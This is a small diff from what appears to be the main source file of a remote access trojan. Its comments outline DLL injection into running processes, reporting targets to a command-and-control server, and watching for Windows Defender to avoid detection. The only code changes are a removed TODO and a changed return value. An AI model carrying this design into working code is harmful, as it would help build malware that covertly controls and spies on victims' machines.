@@ -20,8 +20,6 @@ INT main()
 
     OutputDebugStringA("RAT-Exe-Main::main - Initializing program...\n");
 
-    // First we survey the system, paying particualr attention to Windows Defender specifics 
-    // TODO: Windows Defender call
 
     // First, parse processes on the system we can see to inject our DLL into; send these back to our C2 to see which to inject into
 
@@ -103,7 +101,7 @@ INT main()
     // While our DLL handles commands from client continue to survey the system, calling DLL_PROCESS_DETACH once we suspect a threat
     // TODO: Implement further antivirus monitoring 
 cleanup:
-    return SUCCESS;
+    return status;
 }
 
 
